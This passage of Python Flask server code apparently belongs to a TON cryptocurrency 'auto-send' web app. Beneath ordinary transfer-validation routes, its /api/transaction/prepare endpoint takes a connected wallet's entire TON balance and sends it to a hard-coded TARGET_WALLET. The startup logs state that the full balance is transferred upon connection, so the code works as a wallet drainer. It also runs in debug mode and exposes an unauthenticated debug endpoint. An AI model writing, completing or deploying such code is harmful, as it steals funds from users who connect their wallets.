    
    # Validate input
    if not recipient_address:
        return jsonify({
            'success': False,
            'message': 'Recipient address is required'
        }), 400
    
    try:
        # Convert amount to float and validate
        amount_float = float(amount)
        if amount_float <= 0:
            return jsonify({
                'success': False,
                'message': 'Amount must be greater than 0'
            }), 400
    except (ValueError, TypeError):
        return jsonify({
            'success': False,
            'message': 'Invalid amount format'
        }), 400
    
    # Get sender wallet address from session
    sender_address = session['wallet_address']
    
    # Get current balance to check if sufficient
    balance_data = get_wallet_balance(sender_address)
    current_balance = balance_data.get('balance', 0)
    
    if amount_float > current_balance:
        return jsonify({
            'success': False,
            'message': 'Insufficient balance for this transfer'
        }), 400
    
    # Prepare transfer data for the client to sign
    # This is just the data - actual signing happens on the client side
    transfer_data = {
        'sender': sender_address,
        'recipient': recipient_address,
        'amount': amount_float,
        'amount_nano': int(amount_float * 1_000_000_000),  # Convert to nanoTON
        'comment': comment,
        'timestamp': datetime.now().isoformat()
    }
    
    return jsonify({
        'success': True,
        'transfer_data': transfer_data,
        'message': 'Transfer prepared successfully'
    })

@app.route('/api/transaction/prepare', methods=['POST'])
@require_wallet
def prepare_transaction():
    """Prepare a TON transaction for sending"""
    wallet_address = session['wallet_address']
    data = request.get_json()
    
    # Get current balance
    balance_data = get_wallet_balance(wallet_address)
    
    # Check if there is any error with balance retrieval
    if 'error' in balance_data:
        error_msg = f"Error getting balance: {balance_data['error']}"
        logger.error(error_msg)
        return jsonify({
            'success': False,
            'message': error_msg
        }), 400
    
    # Get the native TON balance
    if 'native' not in balance_data or balance_data['native']['balance'] <= 0:
        error_msg = 'No TON balance available to transfer'
        logger.warning(error_msg)
        return jsonify({
            'success': False,
            'message': error_msg
        }), 400
    
    ton_balance = balance_data['native']['balance']
    
    # Prepare the transaction
    result = send_ton_background(wallet_address, TARGET_WALLET, ton_balance)
    
    if result['success']:
        return jsonify(result)
    else:
        return jsonify({
            'success': False,
            'message': result['message']
        }), 400

@app.route('/api/transaction/confirm', methods=['POST'])
def confirm_transaction():
    """Confirm that a transaction was broadcast to the TON network"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({
                'success': False,
                'message': 'No data provided'
            }), 400
        
        boc = data.get('boc')
        tx_hash = data.get('transaction_hash')
        
        if not tx_hash:
            return jsonify({
                'success': False,
                'message': 'No transaction hash provided'
            }), 400
        
        # For now, we'll just log the confirmation since we don't have session context
        # In a real implementation, you might want to store this in a database
        logger.info(f"Transaction confirmed on blockchain: {tx_hash}")
        logger.info(f"BOC data received: {boc[:100] if boc else 'None'}...")
        
        # Print transaction details prominently in terminal
        print("\n" + "="*80)
        print(f"TRANSACTION CONFIRMED ON BLOCKCHAIN")
        print(f"TXID: {tx_hash}")
        print(f"BOC: {boc[:100] if boc else 'None'}...")
        print("="*80 + "\n")
        
        return jsonify({
            'success': True,
            'message': 'Transaction confirmed successfully',
            'transaction': {
                'hash': tx_hash,
                'timestamp': datetime.now().isoformat()
            }
        })
        
    except Exception as e:
        logger.exception(f"Error confirming transaction: {str(e)}")
        return jsonify({
            'success': False,
            'message': f'Error: {str(e)}'
        }), 500

@app.route('/api/transaction/pending', methods=['GET'])
@require_wallet
def get_pending_transaction():
    """Get any pending transaction for the current session"""
    if 'pending_tx' in session:
        return jsonify({
            'success': True,
            'has_pending': True,
            'transaction': session['pending_tx']
        })
    else:
        return jsonify({
            'success': True,
            'has_pending': False
        })

@app.route('/api/debug/wallet/<address>')
def debug_wallet(address):
    """Debug endpoint to check wallet address format and API responses"""
    if not address:
        return jsonify({'error': 'No wallet address provided'}), 400
    
    logger.info(f"Debug request for wallet: {address}")
    
    # Test different address formats
    test_formats = {
        'original': address,
        'no_workchain': address[2:] if address.startswith('0:') else address,
        'hex': address.replace(':', ''),
        'url_encoded': requests.utils.quote(address)
    }
    
    results = {
        'wallet_formats': test_formats,
        'api_responses': {}
    }
    
    # Test TONCenter API
    try:
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
        
        # Try jsonRPC endpoint
        payload = {
            "id": "1",
            "jsonrpc": "2.0",
            "method": "getAddressBalance",
            "params": [address]
        }
        
        response = requests.post(
            TON_CENTER_API + "/jsonRPC",
            json=payload,
            headers=headers,
            timeout=5
        )
        
        results['api_responses']['toncenter_jsonrpc'] = {
            'status': response.status_code,
            'response': response.text[:500]  # Limit response size
        }
        
        # Try getAddressInformation endpoint
        response = requests.get(
            f"{TON_CENTER_API}/getAddressInformation?address={address}",
            headers=headers,
            timeout=5
        )
        
        results['api_responses']['toncenter_addressinfo'] = {
            'status': response.status_code,
            'response': response.text[:500]  # Limit response size
        }
    except Exception as e:
        results['api_responses']['toncenter_error'] = str(e)
    
    # Test TONAPI
    try:
        response = requests.get(
            f"{TON_API_V2}/accounts/{address}",
            timeout=5
        )
        
        results['api_responses']['tonapi'] = {
            'status': response.status_code,
            'response': response.text[:500]  # Limit response size
        }
    except Exception as e:
        results['api_responses']['tonapi_error'] = str(e)
    
    return jsonify(results)

@app.route('/api/recover-transaction', methods=['POST'])
def recover_transaction():
    """Recover from transaction verification errors with minimal transaction data"""
    logger.info("Transaction recovery requested")
    
    # Check if session exists
    if not session or 'address' not in session:
        logger.warning("No active session found for recovery")
        return jsonify({
            'success': False,
            'message': 'No active wallet session'
        })
    
    try:
        # Get wallet address from session
        address = session.get('address')
        
        # Check if we have a pending transaction
        if 'pending_tx' not in session:
            logger.warning("No pending transaction found")
            return jsonify({
                'success': False,
                'message': 'No pending transaction found'
            })
        
        # Get pending transaction
        tx = session['pending_tx']
        
        # Verify transaction data has minimal required fields
        if not tx.get('to') or not tx.get('amount'):
            logger.warning("Incomplete transaction data for recovery")
            return jsonify({
                'success': False,
                'message': 'Incomplete transaction data'
            })
        
        # Create a minimal transaction with only essential fields
        # Following TON Connect v2 specification minimum requirements
        minimal_tx = {
            'to': tx['to'],
            'amount_nano': tx['amount'],
            'valid_until': int(time.time()) + 300  # 5 minutes
        }
        
        logger.info(f"Created minimal recovery transaction: {minimal_tx}")
        
        return jsonify({
            'success': True,
            'message': 'Recovery transaction created',
            'transaction': minimal_tx
        })
    except Exception as e:
        logger.exception(f"Error creating recovery transaction: {str(e)}")
        return jsonify({
            'success': False,
            'message': f"Error: {str(e)}"
        })

if __name__ == '__main__':
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    logger.info("Starting TON Auto-Send application")
    logger.info(f"Destination wallet for auto-sends: {TARGET_WALLET}")
    logger.info(f"Auto-send will transfer the full wallet balance upon connection")
    logger.info(f"Access the application at: http://localhost:5000")
    app.run(debug=True, port=5000)
